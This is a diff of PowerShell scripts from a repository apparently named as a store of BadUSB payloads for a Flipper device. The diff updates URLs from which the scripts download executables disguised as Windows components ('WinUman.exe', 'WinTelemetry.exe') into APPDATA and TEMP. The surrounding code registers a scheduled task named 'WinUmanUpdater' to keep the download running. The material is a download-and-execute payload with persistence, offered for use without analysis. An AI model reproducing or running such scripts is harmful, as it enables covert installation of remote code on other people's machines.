@@ -1,5 +1,5 @@
 # Variables
-$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinUman.exe"
+$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
 $exePath = "$env:APPDATA\WinUman.exe"
 $taskName = "WinUmanUpdater"
 
@@ -16,7 +16,7 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Ru
 
 Write-Host "Setup complete. Scheduled task '$taskName' created."
 # Define variables
-$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinTelemetry.exe"
+$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
 $exePath = "$env:TEMP\WinTelemetry.exe"
 
 # Download EXE to temp folder
